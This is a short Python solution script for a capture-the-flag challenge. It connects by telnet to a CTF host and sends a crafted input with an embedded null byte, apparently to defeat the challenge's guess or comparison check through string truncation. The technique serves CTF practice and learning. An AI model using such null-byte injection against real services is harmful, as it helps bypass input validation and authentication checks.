import telnetlib

HOST = 'guess.ctf.upml.tech'
PORT = 1337

tn = telnetlib.Telnet(HOST, PORT)
tn.read_some()
tn.read_some()
tn.write(b'0123456789ABCDE\x000123456789ABCDE\n')

print(tn.read_some())
